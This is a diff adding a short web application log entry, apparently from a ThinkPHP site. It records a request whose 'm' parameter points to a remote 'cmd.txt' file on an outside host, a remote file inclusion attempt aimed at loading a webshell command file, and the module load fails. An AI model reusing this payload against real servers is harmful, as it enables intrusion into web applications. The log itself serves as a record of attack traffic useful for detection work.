@@ -1,0 +1,6 @@
+[ 2016-03-08T21:34:08+08:00 ] 200.98.129.111 /index.php?m=http://pader-g.org/templates/beez5/cmd.txt?
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000263s ]
+ERR: 无法加载模块:Http://pader-g.org/templates/beez5/cmd.txt?
+
